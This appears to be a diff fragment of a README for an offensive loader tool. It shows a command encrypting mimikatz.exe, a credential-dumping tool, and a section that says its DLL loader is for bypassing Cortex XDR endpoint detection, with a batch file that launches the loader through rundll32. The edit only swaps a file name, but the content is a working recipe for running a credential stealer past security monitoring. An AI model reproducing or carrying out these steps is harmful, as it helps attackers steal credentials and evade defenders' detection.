@@ -25,7 +25,7 @@ root@kali>./encryptor -f mimikatz.exe -o bin.enc
 ```
 
 ## Loader (DLL)
-for bypassing Cortex XDR,add agressor.dll with bin.tmp in the same folder and script the following bat file 
+for bypassing Cortex XDR,add agressor.dll with bin.enc in the same folder and script the following bat file 
 ```
 @echo off 
 cmd.exe /c rundll32.exe agressor.dll,stealth
